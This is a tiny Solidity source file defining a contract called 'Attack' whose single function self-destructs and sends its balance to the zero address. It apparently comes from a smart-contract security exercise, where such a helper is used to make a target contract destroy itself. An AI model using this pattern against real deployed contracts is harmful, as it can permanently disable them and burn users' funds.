// SPDX-License-Identifier: MIT

pragma solidity < 0.7.0;

contract Attack {
    function execution() public {
        selfdestruct(payable(0x0));
    }
}